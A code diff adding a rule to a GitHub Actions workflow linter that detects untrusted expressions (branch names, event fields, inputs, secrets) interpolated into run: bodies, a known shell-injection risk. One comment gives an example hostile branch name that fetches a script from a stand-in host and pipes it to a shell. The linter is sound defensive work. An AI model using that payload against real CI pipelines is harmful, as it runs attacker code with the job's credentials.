@@ -188,6 +188,68 @@ function emptyExpressions(text) {
   return found;
 }
 
+/**
+ * Rule 6 — a value somebody outside this repository can choose, interpolated into a `run:` body.
+ *
+ * A `run:` block is assembled as text before any shell sees it, so an expression in one is not an
+ * argument, it is source code. A branch called `$(curl evil.sh|sh)` runs on the runner with the
+ * job's token, on a pull request anyone can open. GitHub's guidance is the same every time: put the
+ * value in `env:` and read `$VAR`, where a shell treats it as data.
+ *
+ * The list below is deliberately the things a STRANGER can type — ref and branch names, anything
+ * under `github.event`, and dispatch inputs — plus `secrets.*`, which belongs in env for a
+ * different reason: a secret pasted into a script is one `set -x` from the log, and one awkward
+ * character from being a syntax error in the middle of a deploy.
+ *
+ * What it does not flag is what this repository's own jobs produce: run numbers, shas, job results,
+ * step outcomes, matrix values, job outputs. Those can carry untrusted data if a job puts it there,
+ * and a rule that says so would be more correct and would flag twenty-one lines of summary tables
+ * that echo a build version. A gate nobody can satisfy gets switched off, so this one draws the
+ * line where the value stops being ours.
+ *
+ * Written after Semgrep's run-shell-injection found three of these here, in ci-tests, mutation and
+ * nightly-full-stack, and four more in the backend's deployment chain.
+ */
+const RUN_BODY_UNTRUSTED = [
+  /^github\.event\b/,
+  /^github\.head_ref$/,
+  /^github\.ref(_name)?$/,
+  /^github\.base_ref$/,
+  /^github\.triggering_actor$/,
+  /^inputs\./,
+  /^github\.event\.inputs\./,
+  /^secrets\./,
+];
+
+function interpolationsInRunBodies(text) {
+  const lines = text.replace(/\r\n/g, '\n').split('\n');
+  const found = [];
+  let indent = -1;
+  lines.forEach((line, idx) => {
+    const opens = line.match(/^(\s*)(?:- )?run: [|>]/);
+    if (opens) {
+      indent = opens[1].length;
+      return;
+    }
+    if (indent < 0) return;
+    const here = line.search(/\S/);
+    if (line.trim() !== '' && here <= indent) {
+      indent = -1;
+      return;
+    }
+    for (const m of line.matchAll(/\$\{\{\s*([^}]*?)\s*\}\}/g)) {
+      // Each operand of the expression, so `inputs.tag || 'main'` is caught by its left-hand side
+      // and a literal default on the right is not mistaken for one.
+      for (const operand of m[1].split(/\|\||&&/).map((x) => x.trim())) {
+        if (!RUN_BODY_UNTRUSTED.some((bad) => bad.test(operand))) continue;
+        found.push({ line: idx + 1, expr: operand, text: line.trim().slice(0, 90) });
+        break;
+      }
+    }
+  });
+  return found;
+}
+
 let problems = 0;
 let scanned = 0;
 for (const root of roots) {
@@ -225,6 +287,15 @@ for (const root of roots) {
           `pointer its owner can move, so pin the SHA and keep the version in a trailing comment`,
       );
     }
+    for (const d of interpolationsInRunBodies(text)) {
+      problems++;
+      console.error(
+        `${path}:${d.line}: \`\${{ ${d.expr} }}\` is interpolated into a run: body — a run: ` +
+          `block is assembled as text before a shell sees it, so a value somebody else chooses ` +
+          `(a branch name, an event field, a dispatch input) becomes source code, and a secret ` +
+          `becomes one \`set -x\` from the log. Put it in \`env:\` and read \`$VAR\` — ${d.text}`,
+      );
+    }
     for (const d of emptyExpressions(text)) {
       problems++;
       console.error(
@@ -241,5 +312,6 @@ if (problems) {
 }
 console.log(
   `check:workflow-env OK — ${scanned} workflow(s): no duplicate keys, no dead expansions,` +
-    ` no literal backslash-n, every action pinned to a commit, no empty expressions.`,
+    ` no literal backslash-n, every action pinned to a commit, no empty expressions,` +
+    ` nothing anyone can type interpolated into a run: body.`,
 );
